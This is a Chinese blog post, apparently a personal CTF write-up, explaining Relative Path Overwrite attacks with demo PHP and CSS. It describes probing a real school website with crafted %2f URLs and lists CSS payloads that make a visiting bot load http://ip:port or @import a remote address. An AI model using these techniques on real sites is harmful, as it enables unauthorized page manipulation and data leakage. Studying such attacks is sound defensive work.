@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="最近见到几个题，了解到一种攻击方式，就是有RPO攻击，就是浏览器解析页面路径有误而导致css文件加载路径错误，从而引发的任意解析。">
+<meta name="keywords" content="css,前端">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RPO攻击">
+<meta property="og:url" content="http://blog.leej.me/2017/04/24/RPO攻击/index.html">
+<meta property="og:site_name" content="Leej">
+<meta property="og:description" content="最近见到几个题，了解到一种攻击方式，就是有RPO攻击，就是浏览器解析页面路径有误而导致css文件加载路径错误，从而引发的任意解析。">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://ww1.sinaimg.cn/mw690/7e2785d1gy1fevj8f89h9j20p80eyt95.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/7e2785d1ly1fevjctwms8j20p108v0sx.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/mw690/7e2785d1gy1fevjhqvulij20lr0790sr.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/mw690/7e2785d1gy1fex6lxf61dj20yi08pn1x.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/mw690/7e2785d1gy1fex6v1pgloj20if034dft.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/mw690/7e2785d1gy1fex6v1hrjlj20kg03gt8p.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/mw690/7e2785d1gy1fex75p7ej1j20i40ac0u6.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/mw690/7e2785d1gy1fex7wick3rj20i20m6dky.jpg">
+<meta property="og:updated_time" content="2018-02-07T04:11:15.709Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="RPO攻击">
+<meta name="twitter:description" content="最近见到几个题，了解到一种攻击方式，就是有RPO攻击，就是浏览器解析页面路径有误而导致css文件加载路径错误，从而引发的任意解析。">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/mw690/7e2785d1gy1fevj8f89h9j20p80eyt95.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>RPO攻击</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/leejgod">Projects</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2017/04/25/False注入,以及SQL注入技巧总结/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2017/01/19/Pthon学习之教务处的登录，以及安全思考/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://blog.leej.me/2017/04/24/RPO攻击/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://blog.leej.me/2017/04/24/RPO攻击/&text=RPO攻击"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://blog.leej.me/2017/04/24/RPO攻击/&title=RPO攻击"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.leej.me/2017/04/24/RPO攻击/&is_video=false&description=RPO攻击"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RPO攻击&body=Check out this article: http://blog.leej.me/2017/04/24/RPO攻击/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://blog.leej.me/2017/04/24/RPO攻击/&title=RPO攻击"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://blog.leej.me/2017/04/24/RPO攻击/&title=RPO攻击"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://blog.leej.me/2017/04/24/RPO攻击/&title=RPO攻击"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://blog.leej.me/2017/04/24/RPO攻击/&title=RPO攻击"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://blog.leej.me/2017/04/24/RPO攻击/&name=RPO攻击&description=&lt;p&gt;最近见到几个题，了解到一种攻击方式，就是有RPO攻击，就是浏览器解析页面路径有误而导致css文件加载路径错误，从而引发的任意解析。&lt;br&gt;"><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RPO攻击"><span class="toc-number">1.</span> <span class="toc-text">RPO攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00概述"><span class="toc-number">1.0.1.</span> <span class="toc-text">0x00概述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#引子："><span class="toc-number">1.0.1.1.</span> <span class="toc-text">引子：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01攻击"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">0x01攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02利用"><span class="toc-number">1.0.2.</span> <span class="toc-text">0x02利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CTF题目"><span class="toc-number">1.0.3.</span> <span class="toc-text">CTF题目</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目一"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">题目一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目二"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">题目二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#附"><span class="toc-number">1.0.4.</span> <span class="toc-text">附</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        RPO攻击
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Leej</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2017-04-24T00:07:17.000Z" itemprop="datePublished">2017-04-24</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/css/">css</a>, <a class="tag-link" href="/tags/前端/">前端</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>最近见到几个题，了解到一种攻击方式，就是有RPO攻击，就是浏览器解析页面路径有误而导致css文件加载路径错误，从而引发的任意解析。<br><a id="more"></a></p>
+<h1 id="RPO攻击"><a href="#RPO攻击" class="headerlink" title="RPO攻击"></a>RPO攻击</h1><p>最近见到几个题，了解到一种攻击方式，就是有RPO攻击</p>
+<h3 id="0x00概述"><a href="#0x00概述" class="headerlink" title="0x00概述"></a>0x00概述</h3><p>浏览器解析页面路径有误而导致css文件加载路径错误，从而引发的任意解析。</p>
+<h4 id="引子："><a href="#引子：" class="headerlink" title="引子："></a>引子：</h4><p>1.在php有些框架中会有些pathinfo模式的url，就像<a href="http://localhost/index.php/home/user/login/var/value/" target="_blank" rel="noopener">http://localhost/index.php/home/user/login/var/value/</a> 如果此时页面需要加载css，同时是以一个相对路径进行加载，会出现什么问题呢？</p>
+<p>2.有时url例如这样<a href="http://test.com/a/b/c/d/e/f.html" target="_blank" rel="noopener">http://test.com/a/b/c/d/e/f.html</a> 的时候,如果<br>我访问的是<a href="http://test.com/a/b/c/d/..%2fe/f.html" target="_blank" rel="noopener">http://test.com/a/b/c/d/..%2fe/f.html</a> 这样会出现啥样的问题？</p>
+<h4 id="0x01攻击"><a href="#0x01攻击" class="headerlink" title="0x01攻击"></a>0x01攻击</h4><p>针对上面的问题，我简单的写了一个demon测试了一下</p>
+<p>php代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php $path=&apos;http://localhost/hello/&apos;?&gt;</span><br><span class="line">&lt;a class=&quot;navbar-brand&quot; href=&quot;&lt;?php echo $path?&gt;url.php&quot;&gt;三国杀&lt;/a&gt;</span><br><span class="line">&lt;li class=&quot;active&quot; id=&apos;wei&apos;&gt;&lt;a href=&quot;&lt;?php echo $path?&gt;url.php/country/wei&quot;&gt;魏&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;li id =&apos;shu&apos;&gt;&lt;a href=&quot;&lt;?php echo $path?&gt;url.php/country/shu&quot;&gt;蜀&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;li class=&quot;active&quot; id=&apos;wu&apos;&gt;&lt;a href=&quot;&lt;?php echo $path?&gt;url.php/country/wu&quot;&gt;吴&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;./style.css&quot; style=&quot;css&quot; /&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$arr=isset($_SERVER[&apos;PATH_INFO&apos;])?explode(&apos;/&apos;,trim($_SERVER[&apos;PATH_INFO&apos;],&apos;/&apos;)):null;</span><br><span class="line">//var_dump($arr);</span><br><span class="line">//echo $arr</span><br><span class="line">$value=&apos;&apos;;</span><br><span class="line">for($_=0;$_&lt;count($arr);$_+=2)</span><br><span class="line">&#123;</span><br><span class="line">    $value[$arr[$_]] = $arr[$_+1];</span><br><span class="line">&#125;</span><br><span class="line">$value[&apos;country&apos;]=isset($value[&apos;country&apos;])?$value[&apos;country&apos;]:null;</span><br><span class="line">switch ($value[&apos;country&apos;]) &#123;</span><br><span class="line">    case &apos;wei&apos;:</span><br><span class="line">        ?&gt;</span><br><span class="line">        &lt;h1&gt;welcome to 魏国!&lt;/h1&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">        break;</span><br><span class="line">    case &apos;shu&apos;:</span><br><span class="line">        ?&gt;</span><br><span class="line"></span><br><span class="line">        &lt;h1&gt;welcome to 蜀国!&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">        &lt;?php</span><br><span class="line">        break;</span><br><span class="line">    case &apos;wu&apos;:</span><br><span class="line">        ?&gt;</span><br><span class="line">        &lt;h1&gt;welcome to 吴国!&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">        &lt;?php</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    default:</span><br><span class="line">        ?&gt;</span><br><span class="line">        &lt;h1&gt;welcome!&lt;/h1&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p>
+<p>style.css文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">h1 &#123;</span><br><span class="line">font-size:180px;</span><br><span class="line">color:blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意这里css文件加载是以一个相对路径加载的</p>
+<p><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;./style.css&quot; style=&quot;css&quot; /&gt;</code></p>
+<p>这里传参是利用<code>/</code>来进行分割，发现直接打开页面是没有问题的。<br><img src="http://ww1.sinaimg.cn/mw690/7e2785d1gy1fevj8f89h9j20p80eyt95.jpg" alt=""></p>
+<p>但是发现如果有传参的话，就出现问题了。<br><img src="http://ww1.sinaimg.cn/large/7e2785d1ly1fevjctwms8j20p108v0sx.jpg" alt=""></p>
+<p>是哪里的问题？</p>
+<p>在这里浏览器误以为我们参数的键/country/是一个实际的路径，从而导致实际加载的css文件路径就成了<br><code>http://localhost/hello/url.php/country/style.css</code></p>
+<p><img src="http://ww1.sinaimg.cn/mw690/7e2785d1gy1fevjhqvulij20lr0790sr.jpg" alt=""></p>
+<p>在这里服务端收到的请求会认为请求/country/style.css是一个键为country值为style.css的参数，从而返回页面。</p>
+<h3 id="0x02利用"><a href="#0x02利用" class="headerlink" title="0x02利用"></a>0x02利用</h3><p>说到底是要实际利用的，之前的例子只是说明了，我们可以打乱他的css的路径使其不能正常显示，那么如果那个加载的css我们可以控制就好了，这里就是用了一个小技巧，下面借鉴国外的一篇文章的分析</p>
+<blockquote>
+<p>css文件路径为../../styles.css，URL写为<br> <code>http://www.google.com/tools/toolbar/buttons/apis%2fhowto_guide.html</code><br><br>返回正确<br>服务器接收到的是<code>/tools/toolbar/buttons/apis/howto_guide.html</code><br><br>浏览器接收到的是 <code>/tools/toolbar/buttons/apis%2fhowto_guide.html</code><br><br>页面中导入的样式表 为 <code>/tools ~~/toolbar/buttons/../../~~ style.css</code><br><br>浏览器认为style.css的根目录是<code>tools/toolbar/buttons</code>，而不是<code>tools/toolbar/button/apis</code><br><br>所以../../style.css跳到了更高一级的目录下</p>
+</blockquote>
+<p>这个就比较有意思了，style.css是往上跳两级，如果我们在这两级中加个/tools/toolbar/<strong>a/..%2f</strong>buttons/apis/howto_guide.html这样，服务器收到这里的是/tools/toolbar/ <del>a/../</del> buttons/apis/howto_guide.html相当于没有加，但是浏览器依然以为/..%2f和后面的是一个路径这样的话我们就使加载的css文件是在一个我们自己构造的文件夹a中了</p>
+<p>这样有啥子用处呢？</p>
+<p>首先要了解的是，浏览器解析css文件是兼容性比较高的，他不去关注那些杂乱的字符，只要我们可以空出一行或者可以分割杂乱字符就可以了，比如<code>asda{}body {background: url(./aaa.jpg);}asfa</code>这样就可以正确的加载。</p>
+<p>其次，如果在网站里还有一处评论留言 或者搜索能使页面的部分内容是我们可以控制的话，我们可以构造css的语句，然后使加载的css文件可以跳到这里，便可以控制页面css的样式了。</p>
+<p>下面举一个例子，还是学校的某处网站（<code>http://xsc.cuit.edu.cn/WebSite/Web/SearchList-Title~111.html</code>）。<br><img src="http://ww1.sinaimg.cn/mw690/7e2785d1gy1fex6lxf61dj20yi08pn1x.jpg" alt=""><br>这里的搜索的参数是直接在url的，我首先想了想如果我们搜索a/c/这样的话浏览器会不会认为这都是路径从而乱套啊，试了一下发现服务器考虑到这个问题，我输入一个/他就会多跳一级。<br><img src="http://ww1.sinaimg.cn/mw690/7e2785d1gy1fex6v1pgloj20if034dft.jpg" alt=""></p>
+<p><img src="http://ww1.sinaimg.cn/mw690/7e2785d1gy1fex6v1hrjlj20kg03gt8p.jpg" alt=""><br>（想了想这种方式还是比较脆弱的，如果我是两个连续的/浏览器并不会认为这是两级目录，但是服务器却会返回调两级的地址。）</p>
+<p>我们这时候还需要找一个可以插入payload的页面<code>http://xxxx/WebSite/Web/NewsList_Wyls.html</code></p>
+<p>分析一下，我们源页面路径是/WebSite/Web/SearchList-Title~111.html，现在需要跳转到/WebSite/Web/NewsList_Wyls.html，如果把NewsList_Wyls.html当成目录的话，那只需要跳一级就可以了，最后构造的url是<code>http://xsc.cuit.edu.cn/WebSite/Web/NewsList_Wyls.html/..%2fSearchList-Title~33s.html</code></p>
+<p><img src="http://ww1.sinaimg.cn/mw690/7e2785d1gy1fex75p7ej1j20i40ac0u6.jpg" alt=""></p>
+<p>可以看到具体加载的css文件成功的转到我们需要的页面了</p>
+<p>可惜的是这里并没有成功渲染，我把加载的css源码拖到本地执行，是有效的，不晓得为啥子这里就不行了。但是总的攻击流程大概就是这样。</p>
+<h3 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h3><h4 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h4><p>最近有CTF就是利用的这个攻击方式的，pwnhub上的那个流程和之前类似，最后就是在user页面写{}*{backgorund: url(‘<a href="http://ip:port&#39;);}然后构造好url提交给bot然后等bot访问后加载css就ok了，说实话这种利用方式感觉并没有什么实际的用处。" target="_blank" rel="noopener">http://ip:port&#39;);}然后构造好url提交给bot然后等bot访问后加载css就ok了，说实话这种利用方式感觉并没有什么实际的用处。</a></p>
+<h4 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h4><p>在<a href="http://117.34.111.15:3000，这道题中就比较有意思了，贴一下出题人的wp" target="_blank" rel="noopener">http://117.34.111.15:3000，这道题中就比较有意思了，贴一下出题人的wp</a></p>
+<p><img src="http://ww1.sinaimg.cn/mw690/7e2785d1gy1fex7wick3rj20i20m6dky.jpg" alt=""></p>
+<p>思路相当可以，差不多就是利用未闭合的单引号来包裹源码，通过访问的url读取源码。</p>
+<p>这里有些坑感觉，由于对css语法并不是很了解，有空了在研究研究看看。</p>
+<h3 id="附"><a href="#附" class="headerlink" title="附"></a>附</h3><p>常见的可以加载加载远程文件的方法</p>
+<p><code>{} @import
+url(&#39;http://1.2.3.4/&#39;);</code><br>或者加载背景<br><code>{}body {background: url(http://ip:port);}</code></p>
+<p>之前看到可以通过这种css的方式加载图片background-image:url(data:image/gif;base64,R0lGODlhAQAcALMAAMXh96HR97XZ98Hf98Xg97DX97nb98Lf97vc98Tg973d96rU97ba97%2Fe96XS9wAAACH5BAAAAAAALAAAAAABABwAAAQVMLhVBDNItXESAURyDI2CGIxQLE4EADs%3D);</p>
+<p>我想是不是可以尝试加载js代码？<br>类似于data类型的地址有如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">data:text/plain,&lt;文本数据&gt;</span><br><span class="line">data:text/html,&lt;HTML代码&gt;</span><br><span class="line">data:text/html;base64,&lt;base64编码的HTML代码&gt;</span><br><span class="line">data:text/css,&lt;CSS代码&gt;</span><br><span class="line">data:text/css;base64,&lt;base64编码的CSS代码&gt;</span><br><span class="line">data:text/javascript,&lt;Javascript代码&gt;</span><br><span class="line">data:text/javascript;base64,&lt;base64编码的Javascript代码&gt;</span><br><span class="line">data:image/gif;base64,base64编码的gif图片数据</span><br><span class="line">data:image/png;base64,base64编码的png图片数据</span><br><span class="line">data:image/jpeg;base64,base64编码的jpeg图片数据</span><br><span class="line">data:image/x-icon;base64,base64编码的icon图片数据</span><br><span class="line">``````</span><br></pre></td></tr></table></figure></p>
+<p>还有这样javascript:alert(‘xss’);<br>发现这样并不会解析。</p>
+<p>LINKS:<br><a href="http://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html</a><br><a href="https://mp.weixin.qq.com/s/P-ncFmNZfBteJBQr8INzsw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/P-ncFmNZfBteJBQr8INzsw</a><br><a href="http://static.hx99.net/static/bugs/wooyun-2011-02203.html" target="_blank" rel="noopener">http://static.hx99.net/static/bugs/wooyun-2011-02203.html</a></p>
+<p>留着以后发现新姿势在利用吧。</p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/leejgod">Projects</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RPO攻击"><span class="toc-number">1.</span> <span class="toc-text">RPO攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00概述"><span class="toc-number">1.0.1.</span> <span class="toc-text">0x00概述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#引子："><span class="toc-number">1.0.1.1.</span> <span class="toc-text">引子：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01攻击"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">0x01攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02利用"><span class="toc-number">1.0.2.</span> <span class="toc-text">0x02利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CTF题目"><span class="toc-number">1.0.3.</span> <span class="toc-text">CTF题目</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目一"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">题目一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目二"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">题目二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#附"><span class="toc-number">1.0.4.</span> <span class="toc-text">附</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://blog.leej.me/2017/04/24/RPO攻击/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://blog.leej.me/2017/04/24/RPO攻击/&text=RPO攻击"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://blog.leej.me/2017/04/24/RPO攻击/&title=RPO攻击"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.leej.me/2017/04/24/RPO攻击/&is_video=false&description=RPO攻击"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RPO攻击&body=Check out this article: http://blog.leej.me/2017/04/24/RPO攻击/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://blog.leej.me/2017/04/24/RPO攻击/&title=RPO攻击"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://blog.leej.me/2017/04/24/RPO攻击/&title=RPO攻击"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://blog.leej.me/2017/04/24/RPO攻击/&title=RPO攻击"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://blog.leej.me/2017/04/24/RPO攻击/&title=RPO攻击"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://blog.leej.me/2017/04/24/RPO攻击/&name=RPO攻击&description=&lt;p&gt;最近见到几个题，了解到一种攻击方式，就是有RPO攻击，就是浏览器解析页面路径有误而导致css文件加载路径错误，从而引发的任意解析。&lt;br&gt;"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 Leej
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/leejgod">Projects</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+
